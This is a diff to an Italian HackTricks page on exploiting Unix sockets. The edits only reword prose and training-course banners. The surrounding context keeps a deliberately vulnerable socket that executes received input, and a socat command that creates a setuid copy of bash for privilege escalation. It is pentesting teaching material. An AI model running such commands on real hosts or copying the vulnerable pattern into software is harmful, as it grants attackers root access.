@@ -17,7 +17,7 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 ## Esempio di binding socket con Python
 
-Nell'esempio seguente viene **creato un socket unix** (`/tmp/socket_test.s`) e tutto ciò che viene **ricevuto** verrà **eseguito** da `os.system`. So che non troverai questo nella vita reale, ma l'obiettivo di questo esempio è vedere come appare un codice che utilizza socket unix e come gestire l'input nel peggior caso possibile.
+Nell'esempio seguente viene **creato un socket unix** (`/tmp/socket_test.s`) e tutto ciò che viene **ricevuto** verrà **eseguito** da `os.system`. So che non troverai questo nella realtà, ma l'obiettivo di questo esempio è vedere come appare un codice che utilizza socket unix e come gestire l'input nel peggior caso possibile.
 
 {% code title="s.py" %}
 ```python
@@ -55,8 +55,8 @@ unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        
 echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
 ```
 {% hint style="success" %}
-Impara e pratica Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Impara e pratica Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Impara e pratica il hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Impara e pratica il hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
